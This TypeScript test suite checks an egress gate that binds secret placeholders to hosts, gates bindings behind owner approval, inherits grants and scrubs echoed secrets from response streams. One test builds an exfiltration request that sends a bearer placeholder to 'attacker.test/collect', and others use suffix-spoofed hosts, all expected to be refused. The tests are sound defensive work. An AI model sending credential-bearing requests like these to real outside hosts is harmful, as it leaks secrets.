// Egress gate — what a container may spend, where, and what it can learn.
//
// The properties under test are the ones a leak would violate: a placeholder
// reveals nothing, a secret only reaches its bound host, a facet never
// out-reaches its parent, and nothing the container reads carries the secret
// back. Everything here goes through the public surface.
import { describe, expect, test } from 'bun:test';
import {
  EGRESS_PLACEHOLDER_PREFIX,
  createInheritedApprovalPolicy,
  createScrubStream,
  decideApproval,
  egressHostMatches,
  egressSecretRule,
  findEgressPlaceholders,
  grantsAreSubset,
  isEgressPlaceholder,
  parseEgressSecretRule,
  planEgress,
  resolveInheritedGrants,
  reviewEgressBinding,
  scrubText,
  type ApprovalGrant,
  type EgressSecretBinding,
  type ShellApprovalMode,
} from '../src/index';

/** A placeholder of the real shape: prefix + 43 base64url characters. */
function placeholder(seed: string): string {
  return `${EGRESS_PLACEHOLDER_PREFIX}${seed.repeat(43).slice(0, 43)}`;
}

const STRIPE: EgressSecretBinding = {
  id: 'bind-stripe',
  label: 'Stripe live key',
  host: 'api.stripe.com',
  placeholder: placeholder('a'),
};

describe('placeholders', () => {
  test('a placeholder is recognised by shape, and a secret is not', () => {
    expect(isEgressPlaceholder(STRIPE.placeholder)).toBe(true);
    expect(isEgressPlaceholder(['sk_live_', 'deadbeefdeadbeefdeadbeef'].join(''))).toBe(false);
    // Right prefix, wrong length: a truncated placeholder must not pass, or a
    // prefix-matching fragment in a log line would be treated as a binding.
    expect(isEgressPlaceholder(`${EGRESS_PLACEHOLDER_PREFIX}tooshort`)).toBe(false);
  });

  test('placeholders are found inside larger strings and deduplicated', () => {
    const found = findEgressPlaceholders(
      `Authorization: Bearer ${STRIPE.placeholder}; retry with ${STRIPE.placeholder}`,
    );
    expect(found).toEqual([STRIPE.placeholder]);
  });

  test('a string with no placeholder yields none', () => {
    expect(findEgressPlaceholders('GET /v1/charges HTTP/1.1')).toEqual([]);
  });
});

describe('host matching', () => {
  test('exact and case-insensitive', () => {
    expect(egressHostMatches('api.stripe.com', 'api.stripe.com')).toBe(true);
    expect(egressHostMatches('API.Stripe.COM', 'api.stripe.com')).toBe(true);
    expect(egressHostMatches('api.stripe.com', 'api.github.com')).toBe(false);
  });

  test('a glob spans a label but stays anchored at both ends', () => {
    expect(egressHostMatches('*.stripe.com', 'api.stripe.com')).toBe(true);
    // The suffix trick: an unanchored check would let an attacker-controlled
    // domain that merely CONTAINS the bound host collect the secret.
    expect(egressHostMatches('api.stripe.com', 'api.stripe.com.attacker.test')).toBe(false);
    expect(egressHostMatches('*.stripe.com', 'stripe.com.attacker.test')).toBe(false);
  });

  test('a dot in the pattern is literal, not a wildcard', () => {
    expect(egressHostMatches('api.stripe.com', 'apiXstripeXcom')).toBe(false);
  });

  test('an empty pattern matches nothing', () => {
    expect(egressHostMatches('', 'api.stripe.com')).toBe(false);
  });
});

describe('planEgress', () => {
  test('traffic carrying no placeholder forwards untouched', () => {
    const plan = planEgress(
      { host: 'example.com', url: 'https://example.com/', headers: [['accept', '*/*']] },
      [STRIPE],
    );
    expect(plan).toEqual({ kind: 'forward', substitutions: [] });
  });

  test('a placeholder bound to this host is substituted', () => {
    const plan = planEgress({
      host: 'api.stripe.com',
      url: 'https://api.stripe.com/v1/charges',
      headers: [['authorization', `Bearer ${STRIPE.placeholder}`]],
    }, [STRIPE]);
    expect(plan).toEqual({
      kind: 'forward',
      substitutions: [{ bindingId: 'bind-stripe', placeholder: STRIPE.placeholder }],
    });
  });

  test('a placeholder in the URL is substituted too — some APIs want it there', () => {
    const plan = planEgress({
      host: 'api.stripe.com',
      url: `https://api.stripe.com/v1/charges?key=${STRIPE.placeholder}`,
      headers: [],
    }, [STRIPE]);
    expect(plan.kind).toBe('forward');
    expect(plan.kind === 'forward' && plan.substitutions).toHaveLength(1);
  });

  test('THE EXFILTRATION CASE: a placeholder sent to another host is refused', () => {
    const plan = planEgress({
      host: 'attacker.test',
      url: 'https://attacker.test/collect',
      headers: [['authorization', `Bearer ${STRIPE.placeholder}`]],
    }, [STRIPE]);
    expect(plan.kind).toBe('refuse');
    expect(plan.kind === 'refuse' && plan.status).toBe(403);
    // The refusal names the destination and the binding, never the secret.
    expect(plan.kind === 'refuse' && plan.reason).toContain('api.stripe.com');
    expect(plan.kind === 'refuse' && plan.reason).toContain('attacker.test');
  });

  test('a revoked placeholder is refused, not forwarded as a dummy', () => {
    const plan = planEgress({
      host: 'api.stripe.com',
      url: 'https://api.stripe.com/v1/charges',
      headers: [['authorization', `Bearer ${placeholder('z')}`]],
    }, [STRIPE]);
    expect(plan.kind).toBe('refuse');
    expect(plan.kind === 'refuse' && plan.status).toBe(403);
  });

  test('with no active bindings at all, every placeholder is refused', () => {
    const plan = planEgress({
      host: 'api.stripe.com',
      url: 'https://api.stripe.com/',
      headers: [['authorization', `Bearer ${STRIPE.placeholder}`]],
    }, []);
    expect(plan.kind).toBe('refuse');
  });
});

describe('approval composition', () => {
  test('binding a secret always gates, and names its rule in the shared vocabulary', () => {
    const review = reviewEgressBinding(STRIPE);
    expect(review.decision).toBe('gate');
    expect(review.hits).toHaveLength(1);
    expect(review.hits[0].rule).toBe('egress-secret:bind-stripe');
    expect(parseEgressSecretRule(review.hits[0].rule)).toBe('bind-stripe');
  });

  test('a rule that is not an egress rule parses to null', () => {
    expect(parseEgressSecretRule('rm-rf')).toBeNull();
    expect(parseEgressSecretRule('egress-secret:')).toBeNull();
  });

  test('an egress binding is gated even on the agent\'s own container', () => {
    // `sandbox` is in AGENT_OWN_EXECUTORS, which exempts LOCAL harm. An egress
    // carrying the owner's credential reaches out, so the exemption must not
    // reach it — proven through the real ladder, with nobody to ask.
    const decision = decideApproval(
      { command: 'bind', executor: 'sandbox' },
      reviewEgressBinding(STRIPE),
      { mode: () => 'strict' },
    );
    return decision.then((d) => {
      expect(d.run).toBe(false);
      expect(d.run === false && d.message).toContain('needs owner approval');
    });
  });

  test('a standing grant stops the asking', async () => {
    const granted: ApprovalGrant = { rule: egressSecretRule('bind-stripe'), executor: 'sandbox' };
    const decision = await decideApproval(
      { command: 'bind', executor: 'sandbox' },
      reviewEgressBinding(STRIPE),
      { mode: () => 'strict', granted: (g) => g.rule === granted.rule && g.executor === granted.executor },
    );
    expect(decision.run).toBe(true);
  });

  test('a grant for a DIFFERENT binding does not authorise this one', async () => {
    const decision = await decideApproval(
      { command: 'bind', executor: 'sandbox' },
      reviewEgressBinding(STRIPE),
      { mode: () => 'strict', granted: (g) => g.rule === egressSecretRule('bind-github') },
    );
    expect(decision.run).toBe(false);
  });

  test('a grant on a different executor does not authorise this one', async () => {
    const decision = await decideApproval(
      { command: 'bind', executor: 'sandbox' },
      reviewEgressBinding(STRIPE),
      {
        mode: () => 'strict',
        granted: (g) => g.rule === egressSecretRule('bind-stripe') && g.executor === 'laptop',
      },
    );
    expect(decision.run).toBe(false);
  });
});

describe('grants are the workspace set, or a subset', () => {
  const root: ApprovalGrant[] = [
    { rule: 'rm-rf', executor: 'sandbox' },
    { rule: egressSecretRule('bind-stripe'), executor: 'sandbox' },
  ];

  test('a facet that has recorded nothing inherits the whole root set', () => {
    // The live bug: a facet reads its own empty agent_config and re-asks for
    // consent the owner already gave on the workspace.
    expect(resolveInheritedGrants({ root, own: null })).toEqual(root);
    expect(resolveInheritedGrants({ root, own: [] })).toEqual(root);
  });

  test('a facet that narrowed itself keeps only what it kept', () => {
    const own = [{ rule: 'rm-rf', executor: 'sandbox' }];
    expect(resolveInheritedGrants({ root, own })).toEqual(own);
  });

  test('a facet can never hold a grant its root lacks', () => {
    const own = [
      { rule: 'rm-rf', executor: 'sandbox' },
      { rule: egressSecretRule('bind-prod-db'), executor: 'sandbox' },
      { rule: 'rm-rf', executor: 'laptop' },
    ];
    const resolved = resolveInheritedGrants({ root, own });
    expect(resolved).toEqual([{ rule: 'rm-rf', executor: 'sandbox' }]);
    expect(grantsAreSubset(resolved, root)).toBe(true);
  });

  test('grantsAreSubset is exact about the executor', () => {
    expect(grantsAreSubset([{ rule: 'rm-rf', executor: 'laptop' }], root)).toBe(false);
    expect(grantsAreSubset([], root)).toBe(true);
    expect(grantsAreSubset(root, root)).toBe(true);
  });
});

describe('inherited approval policy', () => {
  function rootSource(mode: ShellApprovalMode, grants: ApprovalGrant[], own: ApprovalGrant[] | null = null) {
    let fetches = 0;
    return {
      calls: () => fetches,
      source: {
        fetchRoot: async () => { fetches += 1; return { mode, grants }; },
        ownGrants: () => own,
      },
    };
  }

  test('before the root has been reached it fails CLOSED', () => {
    const policy = createInheritedApprovalPolicy(rootSource('allow_all', []).source);
    expect(policy.mode()).toBe('strict');
    expect(policy.granted?.({ rule: 'rm-rf', executor: 'sandbox' })).toBe(false);
  });

  test('after resolving, the root\'s mode and grants apply', async () => {
    const grant = { rule: egressSecretRule('bind-stripe'), executor: 'sandbox' };
    const policy = createInheritedApprovalPolicy(rootSource('allow_all', [grant]).source);
    await policy.resolve?.();
    expect(policy.mode()).toBe('allow_all');
    expect(policy.granted?.(grant)).toBe(true);
    expect(policy.granted?.({ rule: 'other', executor: 'sandbox' })).toBe(false);
  });

  test('a facet cannot record a grant — there is nothing to remember with', () => {
    const policy = createInheritedApprovalPolicy(rootSource('strict', []).source);
    expect(policy.remember).toBeUndefined();
    expect(policy.requestApproval).toBeUndefined();
  });

  test('the ladder resolves the root before reading, so a granted facet does not re-ask', async () => {
    // The whole point, end to end: the owner granted this on the workspace,
    // the facet holds no grant of its own, and the facet does not ask again.
    const grant = { rule: egressSecretRule('bind-stripe'), executor: 'sandbox' };
    const probe = rootSource('strict', [grant]);
    const policy = createInheritedApprovalPolicy(probe.source);
    const decision = await decideApproval(
      { command: 'bind', executor: 'sandbox' }, reviewEgressBinding(STRIPE), policy,
    );
    expect(decision.run).toBe(true);
    expect(probe.calls()).toBe(1);
  });

  test('an unreachable root narrows the facet instead of unleashing it', async () => {
    const policy = createInheritedApprovalPolicy({
      fetchRoot: () => Promise.reject(new Error('root DO unreachable')),
      ownGrants: () => null,
    });
    await expect(decideApproval(
      { command: 'bind', executor: 'sandbox' }, reviewEgressBinding(STRIPE), policy,
    )).rejects.toThrow('root DO unreachable');
    // And the cached answer never widened.
    expect(policy.mode()).toBe('strict');
    expect(policy.granted?.({ rule: egressSecretRule('bind-stripe'), executor: 'sandbox' })).toBe(false);
  });
});

describe('scrubbing what comes back', () => {
  const SECRET = ['sk_live_', '0123456789abcdef'].join('');
  const REPLACEMENTS = [{ find: SECRET, replaceWith: STRIPE.placeholder }];

  test('an echoed secret is replaced by its placeholder', () => {
    expect(scrubText(`invalid api key: ${SECRET}`, REPLACEMENTS))
      .toBe(`invalid api key: ${STRIPE.placeholder}`);
  });

  test('every occurrence, not just the first', () => {
    const scrubbed = scrubText(`${SECRET} and ${SECRET}`, REPLACEMENTS);
    expect(scrubbed).not.toContain(SECRET);
    expect(findEgressPlaceholders(scrubbed)).toEqual([STRIPE.placeholder]);
  });

  test('text with no secret is unchanged', () => {
    expect(scrubText('all fine', REPLACEMENTS)).toBe('all fine');
  });

  async function pump(chunks: string[]): Promise<string> {
    const encoder = new TextEncoder();
    const source = new ReadableStream<Uint8Array>({
      start(controller) {
        for (const chunk of chunks) controller.enqueue(encoder.encode(chunk));
        controller.close();
      },
    });
    return new Response(source.pipeThrough(createScrubStream(REPLACEMENTS))).text();
  }

  test('a secret inside one chunk is scrubbed', async () => {
    expect(await pump([`error: ${SECRET} rejected`]))
      .toBe(`error: ${STRIPE.placeholder} rejected`);
  });

  test('THE BOUNDARY CASE: a secret split across two chunks is still scrubbed', async () => {
    const half = Math.floor(SECRET.length / 2);
    const out = await pump(['prefix ', SECRET.slice(0, half), `${SECRET.slice(half)} suffix`]);
    expect(out).toBe(`prefix ${STRIPE.placeholder} suffix`);
    expect(out).not.toContain(SECRET);
  });

  test('a secret split one byte at a time is still scrubbed', async () => {
    const out = await pump([...SECRET]);
    expect(out).toBe(STRIPE.placeholder);
  });

  test('a body ending in a partial match flushes the partial verbatim', async () => {
    const partial = SECRET.slice(0, 8);
    expect(await pump(['tail ', partial])).toBe(`tail ${partial}`);
  });

  test('a stream with no secret passes through byte-identical', async () => {
    expect(await pump(['{"ok":true,', '"n":42}'])).toBe('{"ok":true,"n":42}');
  });

  test('binary bytes survive scrubbing undecoded', async () => {
    // A PNG header is not UTF-8. Decoding to scrub would corrupt it.
    const png = new Uint8Array([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 0xff, 0xfe]);
    const source = new ReadableStream<Uint8Array>({
      start(controller) { controller.enqueue(png); controller.close(); },
    });
    const out = new Uint8Array(await new Response(
      source.pipeThrough(createScrubStream(REPLACEMENTS)),
    ).arrayBuffer());
    expect([...out]).toEqual([...png]);
  });

  test('no replacements is a pass-through, not a rewrite', async () => {
    const source = new ReadableStream<Uint8Array>({
      start(controller) { controller.enqueue(new TextEncoder().encode(SECRET)); controller.close(); },
    });
    expect(await new Response(source.pipeThrough(createScrubStream([]))).text()).toBe(SECRET);
  });
});
